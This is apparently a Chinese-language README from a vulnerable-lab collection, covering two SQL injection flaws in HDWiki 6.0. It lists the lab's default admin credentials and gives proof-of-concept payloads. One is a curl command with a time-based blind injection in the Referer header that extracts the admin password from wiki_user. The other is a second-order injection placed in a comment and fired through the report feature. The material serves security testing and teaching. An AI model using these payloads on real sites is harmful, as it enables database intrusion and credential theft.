## 环境说明

* 镜像：src/hdwiki/6.0
  * 后台地址

    http://127.0.0.1/index.php?admin_main

  * 账号/密码：admin/admin123

## HDWiki v6.0 referer注入漏洞

测试镜像

* src/hdwiki/6.0

要求

* PHP < 5.4，开启magic_quote_gpc

影响版本

* hdwiki <= 6.0

参考链接

* [HDWiki v6.0最新版referer注入漏洞](http://www.freebuf.com/vuls/170337.html)

Poc

访问主页并使用任意账号，如admin/admin123登录，在浏览器控制台查看document.cookie获取hd_auth字段。

使用以下命令，将cookie设为获取到的hd_auth，可触发延迟注入。

```shell
curl --cookie "hd_auth=60299rIaUipUYt%2FHhrYjcSBFt%2FDa29IGvtmv9WUFOeC3U%2B4plq90CRpoGfua3Bw3Uj8AyI4h7ZO%2Bz%2BWIQ6LE" --referer "' where if((substr((select password from wiki_user where username='admin'),1,1))!='g',sleep(3),0)#"  "http://docker-ip地址/index.php?user-login"
```



##HDwiki 6.0二次注入漏洞

测试镜像

- src/hdwiki/6.0

影响版本

- hdwiki <= 6.0

参考链接

- [HDwiki二次注入案例分享](http://www.freebuf.com/vuls/175911.html)

Poc

1、使用任意用户登录

2、在任意此条评论以下内容

```
4',(1=sleep(5)),1)#
```

3、点击评论下的举报，理由任意填写，5秒后返回举报成功（触发延迟）